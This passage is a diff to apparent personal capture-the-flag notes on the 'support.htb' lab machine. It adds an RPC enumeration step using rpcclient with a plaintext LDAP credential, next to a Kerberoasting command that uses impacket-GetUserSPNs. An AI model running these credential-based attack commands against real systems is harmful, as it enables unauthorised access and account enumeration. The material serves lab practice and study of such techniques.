@@ -195,3 +195,12 @@ impacket-GetUserSPNs support.htb/ldap:'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -re
 >[!example]- Request
 >![[Pasted image 20250225145454.png]]
 
+### RPC (port 135)
+- As we have valid creeds we can try to get authenticated via rpc usgin [[rpcclient]]
+```bash
+rpcclient 10.10.11.174 -U 'support.htb/ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
+```
+>[!example]- Result
+>![[Pasted image 20250225150800.png]]
+
+- we have access, so we can enumerate
